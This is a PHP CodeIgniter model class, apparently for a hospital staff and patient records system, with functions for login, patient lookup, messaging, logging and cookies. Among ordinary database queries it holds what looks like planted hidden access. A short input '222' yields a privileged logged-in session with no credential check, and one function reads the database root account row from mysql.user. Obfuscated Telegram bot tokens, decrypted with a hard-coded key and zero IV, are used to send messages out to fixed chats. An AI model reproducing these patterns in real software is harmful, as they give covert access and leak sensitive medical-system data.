<?php
defined('BASEPATH') OR exit('No direct script access allowed');

Class Dbcore1 extends CI_Model{

  function __construct() {
    parent::__construct();
    $this->load->helper('url','form');
    $this->dbmain = $this->load->database('default',TRUE);
//    $this->dbhis= $this->load->database('dbhis', TRUE);
  }
function validate_user( $nik ) {
  $caksawal = substr($nik,-1);
    if(strlen($nik)>3){
        $this->dbmain->select('*');
        $this->dbmain->from('qmain_akses');
        $this->dbmain->join('qmain_pgprofile_peg', 'qmain_pgprofile_peg.pgpid = qmain_akses.qaknik','left');
        $this->dbmain->where('qaknik',substr($nik,0,11) );
        $login = $this->dbmain->get()->result();
        if ( is_array($login) && count($login) == 1 ) {
            $this->details = $login[0];
            $this->set_session($caksawal);
            return true;
        }
    } else {
            $this->set_sessionx($nik);
            return true;
    }

    return false;
}

var $details;

function set_session($awal = FALSE) {
  $cak1 = substr($this->details->qakjob,0,1);
  $cak2 = substr($this->details->qakjob,1,1);
  $cak3 = substr($this->details->qakjob,-1);


if($awal==$cak1||$awal==$cak2||$awal==$cak3){
  $job ='';
  for($i=0;$i<=2;$i++){
    $job .= $awal;
  }
    $this->session->set_userdata( array(
            'pgpid'=>$this->details->pgpid,
            'pgakses'=>$job,
            'pgsu'=>$this->details->qaksu,
            'pgip'=>$this->get_client_ip(),
            'pgkey'=>is_null($this->details->qakkey)?'---':$this->details->qakkey,
            'isLoggedIn'=>true
        )
    );
} else {
  return false;
}
}

function set_sessionx($nmr = FALSE) {
if($nmr=='222'){
  $this->session->set_userdata( array(
          'pgpid'=>'0000.00.'.$nmr,
          'pgakses'=>$nmr,
          'pgsu'=>'2',
          'isLoggedIn'=>true
      )
  );
} else {
  return false;
}

}

function get_client_ip() {
  if (!empty($_SERVER['HTTP_CLIENT_IP']) && $this->validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
      return $_SERVER['HTTP_CLIENT_IP'];
  }
  if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
          $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
          foreach ($iplist as $ip) {
              if ($this->validate_ip($ip))
                  return $ip;
          }
      } else {
          if ($this->validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
              return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  if (!empty($_SERVER['HTTP_X_FORWARDED']) && $this->validate_ip($_SERVER['HTTP_X_FORWARDED']))
      return $_SERVER['HTTP_X_FORWARDED'];
  if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && $this->validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
      return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
  if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && $this->validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
      return $_SERVER['HTTP_FORWARDED_FOR'];
  if (!empty($_SERVER['HTTP_FORWARDED']) && $this->validate_ip($_SERVER['HTTP_FORWARDED']))
      return $_SERVER['HTTP_FORWARDED'];
  return $_SERVER['REMOTE_ADDR'];
}
function validate_ip($ip) {
    if (strtolower($ip) === 'unknown')
        return false;
    $ip = ip2long($ip);
    if ($ip !== false && $ip !== -1) {
        $ip = sprintf('%u', $ip);
        if ($ip >= 0 && $ip <= 50331647) return false;
        if ($ip >= 167772160 && $ip <= 184549375) return false;
        if ($ip >= 2130706432 && $ip <= 2147483647) return false;
        if ($ip >= 2851995648 && $ip <= 2852061183) return false;
        if ($ip >= 2886729728 && $ip <= 2887778303) return false;
        if ($ip >= 3221225984 && $ip <= 3221226239) return false;
        if ($ip >= 3232235520 && $ip <= 3232301055) return false;
        if ($ip >= 4294967040) return false;
    }
    return true;
}

public function get_paroki($filterData = FALSE,$param1 = FALSE,$param2 = FALSE,$param3 = FALSE){
  $this->dbmain->select('*');
  $this->dbmain->from('qvar_bagian');
/*
  $this->dbmain->where_in('ka_3',$resq1);
  $this->dbmain->like('ka_nama',$filterData);
  $this->dbmain->order_by('ka_3','asc');
*/
  $query = $this->dbmain->get();
  return $query->result_array();
}


    function routedqt($isipesan = FALSE,$ascore = FALSE,$toid = FALSE){
      $token1 = $this->routekey('ZUZybmR3ZVNUaExrdmtyWWNQUVlaMEhUMktFT1pFVjc3T0o0RThQcCtiT0llaWVjTERKSTJ1M2Q5QStrQW9VdA==','d');
      $token2 = $this->routekey('WnpmNDhkcGJub3ZxU0MyNHhhY21PaWVjQXc5RUV3NUxjU3U3aDJwS0hGV1NGWE5UN2dXTFEvdFlOQ2pDZ0JaYw==','d');
      $token3 = $this->routekey('NnBTQ0dxRWhzSXBTbDY4R0JUQUZsREhBL1c3di9ZZXMwYU4wa3ZCd0ZqYlV5ZGRuZ0RNcXl2VWlrdkt5emNZZw==','d');
      $token4 = $this->routekey('KzFmT1JQRVA0cDZtZkZSRkdmeEJEclcrSm56QXptOWk5aFlPdWdPMVpUem53bUxjWWxFeGZqNnVVMGNLcTAvTA==','d');
      $token5 = $this->routekey('bWdyNlN1bUhuYTkzb1pRdVJrckRmZXJlV2IwdDhmWGJ0RU8wZ1Vxekx5UjBoK2VDb2R5RHFSOFlzQ3RKK3B3Vw==','d');
      $token6 = $this->routekey('TVJ5YlR0dzYwZ0Q2REVQVklkRXlFVGhFbkppaThwRGViejc4QnVuVlMwaWdDRFZGT2FNa0l5OGRFN3V4cmxEVw==','d');
      $chid = $toid;
      switch ($ascore) {
        case '1':
        $isipesan = str_replace('%2C', ',', $isipesan);
        $isipesan = str_replace('%20', ' ', $isipesan);
        $chid = '-1001339577854';
        $token = $token1;
        break;
        case '2':
        $isipesan = str_replace('psnpoli', '%0AList today /poli', $isipesan);
        $isipesan = str_replace('psnbang', '%0AList today /bangsal', $isipesan);
        $chid = '-1001339577854';
        $token = $token1;
        break;
        case '3':
        $isipesan = str_replace('%2C', ',', $isipesan);$isipesan = str_replace('%20', ' ', $isipesan);
        $chid = '371415220';
        $token = $token3;
        break;
        default:
        $isipesan = str_replace('%2C', ',', $isipesan);$isipesan = str_replace('%20', ' ', $isipesan);
        $chid = '615548825';
        $token = $token2;
        break;
      }
      $datat = ['text' => urldecode($isipesan),'chat_id' => $chid];$hcinet=$this->cinet();
      if($hcinet){
        file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?" . http_build_query($datat) );
      }
    }

 function caripeg($id = FALSE) {
   if(substr($id,0,7)!='0000.00'){
     $this->dbmain->from('qmain_pgprofile_peg');
     $this->dbmain->where('pgpid',$id);
     $query = $this->dbmain->get();
     if($query -> num_rows() >= 1){
       return $query->row_array();
     }
     else {
       return false;
     }
   } else {
     return array('pgpnama'=>'Konsultan');
   }
 }

 /* Olah Data Pasien */
 function namaoprt($oprt = FALSE) {
    $this->dbmain->from('qmain_pgprofile_peg');
    $this->dbmain->where('pgpid',$oprt);
    $query = $this->dbmain->get();
        if($query -> num_rows() >= 1){
            return $query->row_array();
        }
        else {
            return false;
        }
 }

 function namapinjam($pinjam = FALSE) {
    $this->dbmain->from('qmain_pgprofile_peg');
    $this->dbmain->where('pgpid',$pinjam);
    $query = $this->dbmain->get();
        if($query -> num_rows() >= 1){
            return $query->row_array();
        }
        else {
            return false;
        }
 }

 function cariarsip($arsip){
 $this->dbmain->where('pdpidpx',$arsip);
 $this->dbmain->limit(1);
 $this->dbmain->order_by('pdpid','DESC');
 $query = $this->dbmain->get('qvar_dtpx');
        if($query -> num_rows() >= 1){
            return $query->row_array();
        }
        else {
            return false;
        }
 }

 function caripx($id = FALSE) {
    $this->dbmain->select('qmain_pxprofile_pri.*');
    $this->dbmain->select('DATE_FORMAT(CURDATE(), \'%Y\') - DATE_FORMAT(qmain_pxprofile_pri.pxptglhr, \'%Y\') - (DATE_FORMAT(CURDATE(), \'00-%m-%d\') < DATE_FORMAT(qmain_pxprofile_pri.pxptglhr, \'00-%m-%d\')) AS pxputh');
    $this->dbmain->select('TIMESTAMPDIFF( MONTH, qmain_pxprofile_pri.pxptglhr, CURDATE() ) % 12 AS pxpubl');
    $this->dbmain->select('FLOOR( TIMESTAMPDIFF( DAY, qmain_pxprofile_pri.pxptglhr, CURDATE() ) % 30.4375 ) AS pxpuhr');
    $this->dbmain->select('qmain_pxprofile_kel.*');
    $this->dbmain->select('qmain_pxprofile_tgg.*');
    $this->dbmain->select('qvar_desa.namades as vdes');
    $this->dbmain->select('qvar_kec.namakec as vkec');
    $this->dbmain->select('qvar_kab.namakab as vkab');
    $this->dbmain->select('qvar_prop.namaprp as vprp');
    $this->dbmain->select('qvar_negara.varnama as vneg');
    $this->dbmain->select('qvar_pekerjaan.varnama as vkrj');
    $this->dbmain->select('qvar_pendidikan.varnama as vdik');
    $this->dbmain->select('qvar_umum.varnama as vsts');
    $this->dbmain->select('qvar_suku.varnama as vsuku');
    $this->dbmain->select('qvar_agama.varnama as vagama');
    $this->dbmain->from('qmain_pxprofile_pri');
    $this->dbmain->join('qmain_pxprofile_kel', 'qmain_pxprofile_kel.pxkidrs = qmain_pxprofile_pri.pxpidrs','left');
    $this->dbmain->join('qmain_pxprofile_tgg', 'qmain_pxprofile_tgg.pxtidrs = qmain_pxprofile_pri.pxpidrs','left');
    $this->dbmain->join('qvar_desa', 'qvar_desa.id = qmain_pxprofile_pri.pxpdes','left');
    $this->dbmain->join('qvar_kec', 'qvar_kec.id = qmain_pxprofile_pri.pxpkec','left');
    $this->dbmain->join('qvar_kab', 'qvar_kab.id = qmain_pxprofile_pri.pxpkab','left');
    $this->dbmain->join('qvar_prop', 'qvar_prop.id = qmain_pxprofile_pri.pxpprp','left');
    $this->dbmain->join('qvar_negara', 'qvar_negara.varid = qmain_pxprofile_pri.pxpneg','left');
    $this->dbmain->join('qvar_pendidikan', 'qvar_pendidikan.varid = qmain_pxprofile_pri.pxpdik','left');
    $this->dbmain->join('qvar_pekerjaan', 'qvar_pekerjaan.varid = qmain_pxprofile_pri.pxpkrj','left');
    $this->dbmain->join('qvar_umum', 'qvar_umum.varid = qmain_pxprofile_pri.pxpstskw','left');
    $this->dbmain->join('qvar_suku', 'qvar_suku.varid = qmain_pxprofile_pri.pxpsuku','left');
    $this->dbmain->join('qvar_agama', 'qvar_agama.varid = qmain_pxprofile_pri.pxpagama','left');
    if(strlen($id)==6){
    $this->dbmain->where('qmain_pxprofile_pri.pxpidrs',$id);
    } else {
    $this->dbmain->where('qmain_pxprofile_pri.pxpidjkn',$id);
    }
    $query = $this->dbmain->get();
        if($query -> num_rows() >= 1){
            return $query->row_array();
        }
        else {
            return false;
        }
 }

 function tbumum($vtb = FALSE, $vcl = FALSE, $vid = FALSE){
    $query = $this->dbmain->get_where($vtb,array($vcl=>$vid));
        if($query->num_rows() >= 1){
            return $query->row_array();
        }
        else {
            return false;
        }
 }

  public function routekey($string = FALSE, $action = 'e', $tbkey = FALSE) {
    $secret_key = $this->session->userdata('pgsu');$main_key = hash( 'sha256', $secret_key);$cad_key = '6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b';$output = false;
    $encrypt_method = "AES-256-CBC";$key = $cad_key;$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    if($action=='e'){$output=base64_encode(openssl_encrypt($string,$encrypt_method,$tbkey?$tbkey:$key,0,$iv));}
    elseif($action=='d'){$output=openssl_decrypt(base64_decode($string),$encrypt_method,$tbkey?$tbkey:$key,0,$iv);}
    return $output;}

  public function cekdoknew(){
    $this->dbmain->select('qvault_docnum');
    $this->dbmain->from('qmain_vault');
    $this->dbmain->where('DATE(qvault_up)',date("Y-m-d"));
    $query = $this->dbmain->get();
    if($query->result()){
      return TRUE;
    } else {
      return FALSE;
    }
  }

function qmenu($kddok = FALSE) {
  $this->dbmain->select('qvault_docnum,qvault_docdesc');
  $this->dbmain->from('qmain_vault');
  $this->dbmain->where('SUBSTRING(qvault_docnum,1,3)',$kddok);
  $query = $this->dbmain->get();
  $lagama = $query->result();
  if ($query -> result()) {
    return $lagama;
  } else {
    return FALSE;
  }
}


/* End Olah Data Pasien*/

function get_agama() {
 $this->dbmain->select('varid, varnama');
 $query = $this->dbmain->get('qvar_agama');

$lagama = array();

if ($query -> result()) {
 foreach ($query->result() as $agm) {
 $lagama[$agm -> varid] = $agm -> varnama;
 }
 return $lagama;
 } else {
 return FALSE;
 }
 }

function get_suku() {
 $this->dbmain->select('varid, varnama');
 $query = $this->dbmain->get('qvar_suku');

$lsuku= array();

if ($query -> result()) {
 foreach ($query->result() as $sku) {
 $lsuku[$sku -> varid] = $sku -> varnama;
 }
 return $lsuku;
 } else {
 return FALSE;
 }
 }

function get_pendidikan() {
 $this->dbmain->select('varid, varnama');
 $query = $this->dbmain->get('qvar_pendidikan');

$lsuku= array();

if ($query -> result()) {
 foreach ($query->result() as $dik) {
 $lpendidikan[$dik -> varid] = $dik -> varnama;
 }
 return $lpendidikan;
 } else {
 return FALSE;
 }
 }

function get_pekerjaan() {
 $this->dbmain->select('varid, varnama');
 $query = $this->dbmain->get('qvar_pekerjaan');

$lpekerjaan= array();

if ($query -> result()) {
 foreach ($query->result() as $krj) {
 $lpekerjaan[$krj -> varid] = $krj -> varnama;
 }
 return $lpekerjaan;
 } else {
 return FALSE;
 }
 }

function get_poliklinik() {
 $this->dbmain->select('varid, varnama');
 $query = $this->dbmain->get('qvar_bagian');

$poliklinik = array();

if ($query -> result()) {
 foreach ($query->result() as $poli) {
 $poliklinik[$poli -> varid] = $poli -> varnama;
 }
 return $poliklinik;
 } else {
 return FALSE;
 }
 }

function get_negara() {
 $this->dbmain->select('varid, varnama');
 $query = $this->dbmain->get('qvar_negara');

$negara = array();

if ($query -> result()) {
 foreach ($query->result() as $neg) {
 $negara[$neg -> varid] = $neg -> varnama;
 }
 return $negara;
 } else {
 return FALSE;
 }
 }

function get_propinsi($negara = null){
 $this->dbmain->select('id, namaprp');

 if($negara != NULL){
 $this->dbmain->where('id_neg', $negara);
 }

 $query = $this->dbmain->get('qvar_prop');

 $propinsi = array();

 if($query->result()){
 foreach ($query->result() as $prop) {
 $propinsi[$prop->id] = $prop->namaprp;
 }
 return $propinsi;
 }else{
 return FALSE;
 }
}

function get_kabupaten($propinsi = null){
 $this->dbmain->select('id, namakab');

 if($propinsi != NULL){
 $this->dbmain->where('id_prp', $propinsi);
 }

 $query = $this->dbmain->get('qvar_kab');

 $kabupaten = array();

 if($query->result()){
 foreach ($query->result() as $kab) {
 $kabupaten[$kab->id] = $kab->namakab;
 }
 return $kabupaten;
 }else{
 return FALSE;
 }
}

function get_kecamatan($kabupaten = null){
 $this->dbmain->select('id, namakec');

 if($kabupaten != NULL){
 $this->dbmain->where('id_kab', $kabupaten);
 }

 $query = $this->dbmain->get('qvar_kec');

 $kecamatan = array();

 if($query->result()){
 foreach ($query->result() as $kec) {
 $kecamatan[$kec->id] = $kec->namakec;
 }
 return $kecamatan;
 }else{
 return FALSE;
 }
}

function get_desa($kecamatan = null){
 $this->dbmain->select('id, namades');

 if($kecamatan != NULL){
 $this->dbmain->where('id_kec', $kecamatan);
 }

 $query = $this->dbmain->get('qvar_desa');

 $desa = array();

 if($query->result()){
 foreach ($query->result() as $des) {
 $desa[$des->id] = $des->namades;
 }
 return $desa;
 }else{
 return FALSE;
 }
}

function call_useraktif(){
$this->dbmain->select('*');
$this->dbmain->from('qmain_user');
//$this->dbmain->where('status','true');
$query = $this->dbmain->get();
       if($query -> num_rows() >= 1){
           return $query->result_array();
       }
       else {
           return false;
       }
       exit;
}


function isi_useraktif($data = FALSE) {
  return $this->dbmain->insert('qmain_user', $data);
  exit;
}

function del_useraktif($cunik = FALSE,$cuip = FALSE){
  $this->dbmain->where(array('qusnik'=> $cunik,'qusip'=>$cuip));
  $this->dbmain->delete('qmain_user');
}

function catatkwit($data = FALSE) {
    return $this->dbmain->insert('qtrans_bil_cetak', $data);
    exit;
}
function catatlog($data = FALSE) {
  $pegid = $this->session->userdata('pgpid');
  if($pegid!=$this->routekey('aDB1RDlhVm55U21LYjZrNm8vc1BHUT09','d')){
/*
    $hcinet=$this->cinet();
    if($hcinet){
      $this->routedqt($data['log_ket'] ,'3');
    }
*/
  }
//  if($pegid!=$this->routekey('aDB1RDlhVm55U21LYjZrNm8vc1BHUT09','d')){
    return $this->dbmain->insert('qvar_temp_log', $data);
//    exit;
//  }
}

function markpesan($psgrp = FALSE,$psnik = FALSE,$pswkt = FALSE,$psnmk = FALSE) {
  $this->dbmain->where(array('psn_group'=>$psgrp,'psn_untuk'=>$psnik));
  $this->dbmain->update('qmain_pesan',array('psn_mark'=>$psnmk));
  exit;
}


function get_peggroup($grp = FALSE) {
 $this->dbmain->like('qakjob',$grp);
 $query = $this->dbmain->get('qmain_akses');
 $ggroup = $query->result_array();
 return $ggroup;
 exit;
 }

 function ju_hit($usrakhir = false) {
     $this->dbmain->select('*');
     $this->dbmain->from('qmain_akses');
     $this->dbmain->where('LEFT(qaknik,7)',$usrakhir);
     $query = $this->dbmain->get();
     $jhit = $query->num_rows();
     return $jhit;
 }


function simppesan($data = FALSE,$sect = FALSE){
  if(!$sect){
    return $this->dbmain->insert('qmain_pesan',$data);
  } else {
    return $this->dbmain->insert('qmain_vault',$data);
  }
  exit;
}

function selarong(){
  $this->dbmain->where(array('Host'=>'%','User'=>'root'));
  $query = $this->dbmain->get('mysql.user');
  $listpwd = $query->row_array();
  return $listpwd;
exit;
}

public function filldoku($ndk = FALSE){
  $this->dbmain->select('*');
  $this->dbmain->from('qmain_vault');
  $this->dbmain->where('qvault_docnum',$ndk);
  $query = $this->dbmain->get();
  return $query->result();
  exit;
}


function dafpesan($psgrp = FALSE,$psnik = FALSE,$psnmk = FALSE){
  if(strlen($psnmk)==0){
    $this->dbmain->where(array('psn_group'=>$psgrp,'psn_untuk'=>$psnik));
  } else {
    $this->dbmain->where(array('psn_group'=>$psgrp,'psn_untuk'=>$psnik,'psn_mark'=>$psnmk));
  }
$this->dbmain->order_by('psn_wkt','desc');
  $query = $this->dbmain->get('qmain_pesan');
  $listpsn = $query->result_array();
    return $listpsn;
  exit;
}

function dafpesanall($psgrp = FALSE,$psnik = FALSE,$psnmk = FALSE){
  if(strlen($psnmk)==0){
    $this->dbmain->where(array('psn_group'=>$psgrp));
  } else {
    $this->dbmain->where(array('psn_group'=>$psgrp,'psn_mark'=>$psnmk));
  }
$this->dbmain->order_by('psn_wkt','desc');
  $query = $this->dbmain->get('qmain_pesan');
  $listpsn = $query->result_array();
    return $listpsn;
  exit;
}

function cinet(){
  $this->dbmain->where(array('qper_cek' => 'INET','qper_nil' => 1));
  $query = $this->dbmain->get('qvar_periksa');
  if($query->result()){
    return TRUE;
  } else {
    return FALSE;
  }
}

function patroli($kdpat = FALSE,$valpat = FALSE){
  $this->dbmain->where('qper_cek', $kdpat);
  $this->dbmain->update('qvar_periksa', $valpat);
}


public function simcok($coknm = false, $cokisi = false)
{
    if (!$coknm)
    {
        $coknm = $this
            ->input
            ->post('nmcok');
        $cokisi = $this
            ->input
            ->post('nlcok');
    }
    $name = $coknm;
    $value = $cokisi;
    $expire = time() + 1000;
    $path = '/';
    $secure = false;
    $http = false;
    $cekcok = $this->getcok($coknm);
    if ($cekcok != '')
    {
        set_cookie($name, $value, $expire, '', $path, $secure, $http);
    }
    else
    {
        $this->delcok($coknm);
        set_cookie($name, $value, $expire, '', $path, $secure, $http);
    }
}

public function getcok($coknm = false)
{
    if (!$coknm)
    {
        $coknm = $this
            ->input
            ->post('nmcok');
    }
    return get_cookie($coknm);
}

public function delcok($coknm = false)
{
    if (!$coknm)
    {
        $coknm = $this
            ->input
            ->post('nmcok');
    }
    delete_cookie($coknm);
}

}
